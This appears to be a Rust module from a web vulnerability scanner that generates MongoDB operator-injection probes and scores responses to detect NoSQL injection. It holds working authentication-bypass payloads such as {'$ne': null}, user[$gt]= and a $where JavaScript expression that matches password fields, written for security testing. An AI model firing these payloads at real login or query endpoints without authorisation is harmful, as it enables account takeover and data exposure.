//! NoSQL Injection Engine (MongoDB & Document Stores)
//!
//! Evaluates operator injection in JSON bodies and URL query parameters:
//! - Operator injections: $ne, $gt, $where, $regex, $in
//! - Differential status and JSON structure comparison
//! - Negative control validation

use serde::{Deserialize, Serialize};

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum NoSqliOperator {
    NotEqual,       // {"$ne": null} or user[$ne]=1
    GreaterThan,    // {"$gt": ""} or user[$gt]=
    WhereJavascript,// {"$where": "this.password.match(/.*/)"}
    RegexMatch,     // {"$regex": "^admin"}
    InList,         // {"$in": ["admin", "root"]}
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqliProbe {
    pub operator: NoSqliOperator,
    pub payload_json: String,
    pub query_param: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct NoSqliVerificationResult {
    pub is_vulnerable: bool,
    pub operator: NoSqliOperator,
    pub confidence: f32,
    pub description: String,
}

pub struct NoSqliEngine;

impl NoSqliEngine {
    /// Generates NoSQL injection test payloads for a parameter
    pub fn generate_probes(param_name: &str) -> Vec<NoSqliProbe> {
        vec![
            NoSqliProbe {
                operator: NoSqliOperator::NotEqual,
                payload_json: format!("{{\"{}\": {{\"$ne\": null}}}}", param_name),
                query_param: format!("{}[$ne]=null", param_name),
                description: "MongoDB $ne (not equal) operator injection".to_string(),
            },
            NoSqliProbe {
                operator: NoSqliOperator::GreaterThan,
                payload_json: format!("{{\"{}\": {{\"$gt\": \"\"}}}}", param_name),
                query_param: format!("{}[$gt]=", param_name),
                description: "MongoDB $gt (greater than) operator injection".to_string(),
            },
            NoSqliProbe {
                operator: NoSqliOperator::RegexMatch,
                payload_json: format!("{{\"{}\": {{\"$regex\": \".*\"}}}}", param_name),
                query_param: format!("{}[$regex]=.*", param_name),
                description: "MongoDB $regex wildcard match injection".to_string(),
            },
        ]
    }

    /// Evaluates NoSQL injection results comparing baseline, true probe, and negative control
    pub fn evaluate_response(
        operator: NoSqliOperator,
        baseline_status: u16,
        probe_status: u16,
        probe_body: &str,
        negative_control_status: u16,
    ) -> Option<NoSqliVerificationResult> {
        // If baseline rejected (401/404) or empty, but $ne / $gt probe succeeded (200/302)
        // and negative control (e.g. impossible $eq probe) is rejected (401/404)
        if (baseline_status == 401 || baseline_status == 404 || baseline_status == 403)
            && (probe_status == 200 || probe_status == 302)
            && (negative_control_status == 401 || negative_control_status == 404 || negative_control_status == 403)
        {
            return Some(NoSqliVerificationResult {
                is_vulnerable: true,
                operator,
                confidence: 0.95,
                description: format!(
                    "NoSQL Injection confirmed with {:?}: Status changed from {} to {} on operator payload, negative control returned {}.",
                    operator, baseline_status, probe_status, negative_control_status
                ),
            });
        }

        // Check for MongoDB syntax error leak in response body
        let lower = probe_body.to_ascii_lowercase();
        if lower.contains("unknown operator:")
            || lower.contains("bad query")
            || lower.contains("cannot use $")
            || lower.contains("mongodberror")
        {
            return Some(NoSqliVerificationResult {
                is_vulnerable: true,
                operator,
                confidence: 0.90,
                description: "NoSQL syntax / operator parsing error disclosed in response body.".to_string(),
            });
        }

        None
    }
}
